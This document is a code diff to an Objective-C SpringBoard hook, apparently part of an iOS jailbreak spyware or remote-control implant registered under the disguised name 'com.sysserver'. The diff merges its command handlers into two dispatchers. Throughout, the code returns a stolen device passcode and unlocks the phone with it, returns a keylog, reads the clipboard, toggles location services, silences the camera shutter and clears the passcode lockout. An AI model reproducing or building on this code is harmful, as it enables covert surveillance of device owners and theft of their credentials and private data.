@@ -12,45 +12,28 @@ NSString *keyLog;
 	fmedia = (SBMediaController *)[%c(SBMediaController) sharedInstance];
 	CPDistributedMessagingCenter *messagingCenter = [CPDistributedMessagingCenter centerNamed:@"com.sysserver"];
 	[messagingCenter runServerOnCurrentThread];
-	[messagingCenter registerForMessageName:@"wake" target:self selector:@selector(takeOrder:)];
-	[messagingCenter registerForMessageName:@"lock" target:self selector:@selector(takeOrder:)];
-	[messagingCenter registerForMessageName:@"home" target:self selector:@selector(takeOrder:)];
-	[messagingCenter registerForMessageName:@"doublehome" target:self selector:@selector(takeOrder:)];	
-	[messagingCenter registerForMessageName:@"togglemute" target:self selector:@selector(takeOrder:)];
-	[messagingCenter registerForMessageName:@"play" target:self selector:@selector(takeOrder:)];
-	[messagingCenter registerForMessageName:@"pause" target:self selector:@selector(takeOrder:)];
-	[messagingCenter registerForMessageName:@"next" target:self selector:@selector(takeOrder:)];
-	[messagingCenter registerForMessageName:@"prev" target:self selector:@selector(takeOrder:)];
-	[messagingCenter registerForMessageName:@"keylogclear" target:self selector:@selector(takeOrder:)];
-    [messagingCenter registerForMessageName:@"locationon" target:self selector:@selector(takeOrder:)];
-    [messagingCenter registerForMessageName:@"locationoff" target:self selector:@selector(takeOrder:)];
-    [messagingCenter registerForMessageName:@"silenceShutter" target:self selector:@selector(takeOrder:)];
-
-	[messagingCenter registerForMessageName:@"ismuted" target:self selector:@selector(takeOrderAndReply:withUserInfo:)];
-	[messagingCenter registerForMessageName:@"islocked" target:self selector:@selector(takeOrderAndReply:withUserInfo:)];
-	[messagingCenter registerForMessageName:@"lastapp" target:self selector:@selector(takeOrderAndReply:withUserInfo:)];
-	[messagingCenter registerForMessageName:@"getpasscode" target:self selector:@selector(takeOrderAndReply:withUserInfo:)];
-	[messagingCenter registerForMessageName:@"unlock" target:self selector:@selector(takeOrderAndReply:withUserInfo:)];
-	[messagingCenter registerForMessageName:@"keylog" target:self selector:@selector(takeOrderAndReply:withUserInfo:)];
+	[messagingCenter registerForMessageName:@"commandWithNoReply" target:self selector:@selector(commandWithNoReply:withUserInfo:)];
+	[messagingCenter registerForMessageName:@"commandWithReply" target:self selector:@selector(commandWithReply:withUserInfo:)];
 }
 
 %new
--(void)takeOrder:(NSString *)name {
-	if ([name isEqual:@"play"]) {
+-(void)commandWithNoReply:(NSString *)name withUserInfo:(NSDictionary *)userInfo {
+	NSString *command = [userInfo objectForKey:@"cmd"];
+	if ([command isEqual:@"play"]) {
 		[(SBMediaController *)[%c(SBMediaController) sharedInstance] play];
 	}
-	else if ([name isEqual:@"pause"]) {
+	else if ([command isEqual:@"pause"]) {
 		if ([(SBMediaController *)[%c(SBMediaController) sharedInstance] isPlaying]) {
 			[(SBMediaController *)[%c(SBMediaController) sharedInstance] togglePlayPause];
 		}
 	}
-	else if ([name isEqual:@"next"]) {
+	else if ([command isEqual:@"next"]) {
 		[(SBMediaController *)[%c(SBMediaController) sharedInstance] changeTrack:1];
 	}
-	else if ([name isEqual:@"prev"]) {
+	else if ([command isEqual:@"prev"]) {
 		[(SBMediaController *)[%c(SBMediaController) sharedInstance] changeTrack:-1];
 	}
-	else if ([name isEqual:@"home"]) {
+	else if ([command isEqual:@"home"]) {
 		if ([(SBUIController *)[%c(SBUIController) sharedInstance] respondsToSelector:@selector(handleHomeButtonSinglePressUp)]) {
 			[(SBUIController *)[%c(SBUIController) sharedInstance] handleHomeButtonSinglePressUp];
 		}
@@ -58,17 +41,17 @@ NSString *keyLog;
 			[(SBUIController *)[%c(SBUIController) sharedInstance] clickedMenuButton];
 		}
 	}
-	else if ([name isEqual:@"lock"]) {
+	else if ([command isEqual:@"lock"]) {
 		[(SBUserAgent *)[%c(SBUserAgent) sharedUserAgent] lockAndDimDevice];
 	}
-	else if ([name isEqual:@"wake"]) {
+	else if ([command isEqual:@"wake"]) {
 		[(SBBacklightController *)[%c(SBBacklightController) sharedInstance] cancelLockScreenIdleTimer];
 		[(SBBacklightController *)[%c(SBBacklightController) sharedInstance] turnOnScreenFullyWithBacklightSource:1];
 	}
-	else if ([name isEqual:@"record"]) {
+	else if ([command isEqual:@"record"]) {
 		[self performSelector:@selector(initRecord) withObject:nil afterDelay:0];
 	}
-	else if ([name isEqual:@"doublehome"]) {
+	else if ([command isEqual:@"doublehome"]) {
 		if ([(SBUIController *)[%c(SBUIController) sharedInstance] respondsToSelector:@selector(handleHomeButtonDoublePressDown)]) {
 			[(SBUIController *)[%c(SBUIController) sharedInstance] handleHomeButtonDoublePressDown];
 		}
@@ -76,32 +59,33 @@ NSString *keyLog;
 			[(SBUIController *)[%c(SBUIController) sharedInstance] handleMenuDoubleTap];
 		}
 	}
-	else if ([name isEqual:@"undisabled"]) {
+	else if ([command isEqual:@"undisabled"]) {
 		[(SBDeviceLockController *)[%c(SBDeviceLockController) sharedController] _clearBlockedState];
 	}
-	else if ([name isEqual:@"silenceShutter"]) {
+	else if ([command isEqual:@"silenceShutter"]) {
 		if (!fmedia.ringerMuted) { //if not muted, toggle mute
     		[fmedia setRingerMuted:!fmedia.ringerMuted];
 		}
 	}
-	else if ([name isEqual:@"togglemute"]) {
+	else if ([command isEqual:@"togglemute"]) {
     	[(VolumeControl *)[%c(VolumeControl) sharedVolumeControl] toggleMute];
     	[fmedia setRingerMuted:!fmedia.ringerMuted];
     }
-    else if ([name isEqual:@"keylogclear"]) {
+    else if ([command isEqual:@"keylogclear"]) {
     	keyLog = @"";
     }
-    else if ([name isEqual:@"locationon"]) {
+    else if ([command isEqual:@"locationon"]) {
         [%c(CLLocationManager) setLocationServicesEnabled:true];
     }
-    else if ([name isEqual:@"locationoff"]) {
+    else if ([command isEqual:@"locationoff"]) {
         [%c(CLLocationManager) setLocationServicesEnabled:false];
     }    
 }
 
 %new
-- (NSDictionary *)takeOrderAndReply:(NSString *)name withUserInfo:(NSDictionary *)userInfo {
-	if ([name isEqual:@"getpasscode"]) {
+- (NSDictionary *)commandWithReply:(NSString *)name withUserInfo:(NSDictionary *)userInfo {
+	NSString *command = [userInfo objectForKey:@"cmd"];
+	if ([command isEqual:@"getpasscode"]) {
 		NSString *result = @"";
 		if (passcode != NULL)
 			result = passcode;
@@ -109,18 +93,18 @@ NSString *keyLog;
 			result = @"We have not obtained passcode yet";
 		return [NSDictionary dictionaryWithObject:result forKey:@"returnStatus"];
 	}
-	else if ([name isEqual:@"lastapp"]) {
+	else if ([command isEqual:@"lastapp"]) {
 		SBApplicationIcon *iconcontroller = [(SBIconController *)[%c(SBIconController) sharedInstance] lastTouchedIcon];
 		if (NSString *lastapp = iconcontroller.nodeIdentifier)
 			return [NSDictionary dictionaryWithObject:lastapp forKey:@"returnStatus"];
 		return [NSDictionary dictionaryWithObject:@"none" forKey:@"returnStatus"];
 	}
-	else if ([name isEqual:@"islocked"]) {
+	else if ([command isEqual:@"islocked"]) {
 		if ([(SBLockScreenManager *)[%c(SBLockScreenManager) sharedInstance] isUILocked])  
 			return [NSDictionary dictionaryWithObject:@"true" forKey:@"returnStatus"];
 		return [NSDictionary dictionaryWithObject:@"false" forKey:@"returnStatus"];
 	}
-	else if ([name isEqual:@"ismuted"]) {
+	else if ([command isEqual:@"ismuted"]) {
 		NSString *result = @"";
 		if (fmedia.ringerMuted)
 			result = @"true";
@@ -128,7 +112,7 @@ NSString *keyLog;
 			result = @"false";
 		return [NSDictionary dictionaryWithObject:result forKey:@"returnStatus"];
 	}
-	else if ([name isEqual:@"unlock"]) {
+	else if ([command isEqual:@"unlock"]) {
 		NSString *result = @"";
 		if (passcode != NULL)
 			[(SBLockScreenManager *)[%c(SBLockScreenManager) sharedInstance] attemptUnlockWithPasscode:passcode];
@@ -136,7 +120,7 @@ NSString *keyLog;
 			result = @"We have not obtained passcode yet";
 		return [NSDictionary dictionaryWithObject:result forKey:@"returnStatus"];
 	}
-	else if ([name isEqual:@"keylog"]) {
+	else if ([command isEqual:@"keylog"]) {
 		NSString *result = @"";
 		if (keyLog != NULL) {
 			result = keyLog;
@@ -146,7 +130,7 @@ NSString *keyLog;
 		}
 		return [NSDictionary dictionaryWithObject:result forKey:@"returnStatus"];
 	}
-	else if ([name isEqual:@"getpaste"]) {
+	else if ([command isEqual:@"getpaste"]) {
 		return [NSDictionary dictionaryWithObject:[UIPasteboard generalPasteboard].items[0] forKey:@"returnStatus"];		
 	}
 	
